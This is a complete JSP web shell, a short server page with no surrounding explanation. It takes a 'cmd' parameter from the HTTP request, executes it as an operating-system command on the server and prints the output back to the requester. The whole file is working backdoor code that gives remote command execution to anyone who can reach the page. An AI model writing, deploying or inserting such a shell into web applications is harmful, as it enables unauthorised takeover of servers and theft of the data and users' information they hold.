<%@ page import="java.io.*" %>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
      Process p = Runtime.getRuntime().exec(cmd);
      OutputStream os = p.getOutputStream();
      InputStream in = p.getInputStream();
      int bytesRead = -1;
      byte[] buffer = new byte[1024];
      while ((bytesRead = in.read(buffer)) != -1) {
          out.println(new String(buffer, 0, bytesRead));
      }
  }
%>